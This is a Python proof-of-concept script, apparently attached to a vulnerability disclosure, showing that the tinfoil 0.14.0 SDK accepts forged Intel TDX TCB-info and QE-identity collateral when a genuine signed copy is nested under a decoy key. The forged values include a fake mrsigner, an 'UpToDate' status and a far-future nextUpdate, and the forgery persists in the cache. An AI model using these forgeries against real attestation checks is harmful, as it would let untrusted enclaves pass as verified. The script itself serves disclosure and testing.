"""Independent verifier PoC for the nested-decoy collateral signature differential.
Uses only the installed tinfoil 0.14.0 wheel and the genuine Intel artifacts; no hunter code.
Run: venv/bin/python -I verify_nested.py <data_dir>
"""
import base64, datetime as dt, json, os, sys, tempfile
from unittest import mock
import requests
import tinfoil.attestation.cert_utils as cu
import tinfoil.attestation.collateral_tdx as ct

DATA = sys.argv[1]
FROZEN = dt.datetime(2023, 6, 30, tzinfo=dt.timezone.utc)
class FrozenDT(dt.datetime):
    @classmethod
    def now(cls, tz=None):
        return FROZEN.astimezone(tz) if tz else FROZEN.replace(tzinfo=None)
cu.datetime = FrozenDT; ct.datetime = FrozenDT

def rd(n, m="rb"):
    with open(os.path.join(DATA, n), m) as f: return f.read()

def locate_like_sdk(text, key):
    """Replicates _verify_collateral_signature's locate logic to show what span gets signed."""
    pat = f'"{key}":'; pos = text.find(pat); prefix = text[:pos].rstrip()
    assert pos != -1 and prefix and prefix[-1] in ('{', ','), "SDK guard would reject"
    s = pos + len(pat)
    while text[s] in ' \t\n\r': s += 1
    _, e = json.JSONDecoder().raw_decode(text, s)
    return text[s:e]

def strict_no_dups(raw):
    def hook(pairs):
        ks = [k for k, _ in pairs]
        if len(ks) != len(set(ks)): raise ValueError("dup keys " + str(ks))
        return dict(pairs)
    return json.loads(raw, object_pairs_hook=hook)

def genuine_parts(genuine, key):
    text = genuine.decode(); d = json.loads(genuine)
    inner = locate_like_sdk(text, key)
    assert json.loads(inner) == d[key]
    return inner, d["signature"]

def build(genuine, key, forged, decoy_first=True, tamper=False):
    inner, sig = genuine_parts(genuine, key)
    if tamper: inner = inner.replace('"id":"', '"id":" ', 1)  # 1 byte change in nested copy
    f = json.dumps(forged, separators=(",", ":"))
    if decoy_first:
        body = '{"_":{"%s":%s},"%s":%s,"signature":"%s"}' % (key, inner, key, f, sig)
    else:
        body = '{"%s":%s,"_":{"%s":%s},"signature":"%s"}' % (key, f, key, inner, sig)
    return body.encode()

G_TCB = rd("tcb_info.json").rstrip(); G_QE = rd("qe_identity.json").rstrip()
TCB_CHAIN = ct._parse_issuer_chain_header(rd("tcbInfoIssuerChain.txt", "r").strip())
QE_CHAIN = ct._parse_issuer_chain_header(rd("qeIdentityIssuerChain.txt", "r").strip())

forged_tcb = json.loads(G_TCB)["tcbInfo"]
forged_tcb["tcbEvaluationDataNumber"] = 1234; forged_tcb["nextUpdate"] = "2099-01-01T00:00:00Z"
forged_tcb["tcbLevels"] = [{"tcb": {"sgxtcbcomponents": [{"svn": 0}]*16, "pcesvn": 0, "tdxtcbcomponents": [{"svn": 0}]*16},
                            "tcbDate": "2023-01-01T00:00:00Z", "tcbStatus": "UpToDate"}]
forged_qe = json.loads(G_QE)["enclaveIdentity"]
forged_qe["mrsigner"] = "42"*32; forged_qe["tcbEvaluationDataNumber"] = 1234; forged_qe["nextUpdate"] = "2099-01-01T00:00:00Z"

def case(label, body, key, parse, verify, chain):
    try:
        parsed = parse(body); verify(body, parsed, chain)
        signed = locate_like_sdk(body.decode(), key)
        enforced = json.loads(body)[key]
        diff = json.loads(signed) != enforced
        print(f"[{label}] ACCEPTED  signed-span==genuine:{json.loads(signed)==json.loads(globals()['G_TCB' if key=='tcbInfo' else 'G_QE'])[key]}  enforced!=signed:{diff}  "
              f"enforced evalNum={enforced.get('tcbEvaluationDataNumber')} " + (f"mrsigner={enforced.get('mrsigner')[:8]}.." if key=='enclaveIdentity' else f"levels={[l['tcbStatus'] for l in enforced['tcbLevels']]}"))
        return True
    except Exception as e:
        print(f"[{label}] REJECTED  {type(e).__name__}: {str(e)[:110]}"); return False

print("tinfoil:", ct.__file__)
r = {}
for key, G, F, parse, verify, chain in [
    ("tcbInfo", G_TCB, forged_tcb, ct.parse_tcb_info_response, ct.verify_tcb_info_signature, TCB_CHAIN),
    ("enclaveIdentity", G_QE, forged_qe, ct.parse_qe_identity_response, ct.verify_qe_identity_signature, QE_CHAIN)]:
    print(f"\n=== {key} ===")
    r[key+":genuine"] = case("1 genuine", G, key, parse, verify, chain)
    nested = build(G, key, F)
    strict_no_dups(nested); print("   nested forgery passes strict no-duplicate-key parse at every level")
    r[key+":nested"] = case("2 nested decoy BEFORE forged top-level", nested, key, parse, verify, chain)
    r[key+":after"] = case("3 nested decoy AFTER forged top-level", build(G, key, F, decoy_first=False), key, parse, verify, chain)
    r[key+":tamper"] = case("4 nested decoy with 1-byte tamper of genuine copy", build(G, key, F, tamper=True), key, parse, verify, chain)
    arr = ('{"_":[{"%s":%s}],"%s":%s,"signature":"%s"}' % (key, genuine_parts(G, key)[0], key, json.dumps(F, separators=(",",":")), genuine_parts(G, key)[1])).encode()
    r[key+":array"] = case("5 decoy inside array (prefix char is '{')", arr, key, parse, verify, chain)

# fetch + cache path with a stand-in for tdx-proxy (loopback-free mock of requests.get)
print("\n=== fetch_tcb_info / fetch_qe_identity with mocked transport and empty cache dir ===")
nested_tcb = build(G_TCB, "tcbInfo", forged_tcb); nested_qe = build(G_QE, "enclaveIdentity", forged_qe)
def fake_get(url, timeout=None, **kw):
    assert url.startswith("https://tdx-proxy.tinfoil.sh/"), url
    resp = requests.Response(); resp.status_code = 200; resp.url = url
    if "/tdx/certification/v4/tcb?" in url:
        resp._content = nested_tcb; resp.headers["TCB-Info-Issuer-Chain"] = rd("tcbInfoIssuerChain.txt", "r").strip()
    elif "/qe/identity" in url:
        resp._content = nested_qe; resp.headers["SGX-Enclave-Identity-Issuer-Chain"] = rd("qeIdentityIssuerChain.txt", "r").strip()
    else: raise AssertionError(url)
    return resp
def no_net(*a, **k): raise AssertionError("network used")
with tempfile.TemporaryDirectory() as d:
    with mock.patch.object(ct, "_TDX_CACHE_DIR", d), mock.patch.object(ct.requests, "get", fake_get):
        t, raw, _ = ct.fetch_tcb_info("50806f000000"); q, rawq, _ = ct.fetch_qe_identity()
        print(f"fetch: tcb evalNum={t.tcb_info.tcb_evaluation_data_number} levels={[l.tcb_status.value for l in t.tcb_info.tcb_levels]} "
              f"qe mrsigner={q.enclave_identity.mrsigner.hex()[:8]}..  raw==nested:{raw==nested_tcb and rawq==nested_qe}")
        r["fetch"] = t.tcb_info.tcb_evaluation_data_number == 1234 and q.enclave_identity.mrsigner == b"\x42"*32
    files = sorted(os.listdir(d)); print("cache files:", files)
    cached = json.loads(open(os.path.join(d, "tdx_tcb_info_50806f000000.json")).read())
    print("cache body is the nested forgery:", base64.b64decode(cached["body"]) == nested_tcb)
    with mock.patch.object(ct, "_TDX_CACHE_DIR", d), mock.patch.object(ct.requests, "get", no_net):
        t2, _, _ = ct.fetch_tcb_info("50806f000000"); q2, _, _ = ct.fetch_qe_identity()
        print(f"cache hit, no network: tcb evalNum={t2.tcb_info.tcb_evaluation_data_number} qe mrsigner={q2.enclave_identity.mrsigner.hex()[:8]}..")
        r["cache"] = t2.tcb_info.tcb_evaluation_data_number == 1234 and q2.enclave_identity.mrsigner == b"\x42"*32

print("\nRESULTS:", r)
exp = {"tcbInfo:genuine": True, "tcbInfo:nested": True, "tcbInfo:after": False, "tcbInfo:tamper": False, "tcbInfo:array": True,
       "enclaveIdentity:genuine": True, "enclaveIdentity:nested": True, "enclaveIdentity:after": False, "enclaveIdentity:tamper": False, "enclaveIdentity:array": True,
       "fetch": True, "cache": True}
print("MATCHES EXPECTED:", r == exp)
sys.exit(0 if r == exp else 1)
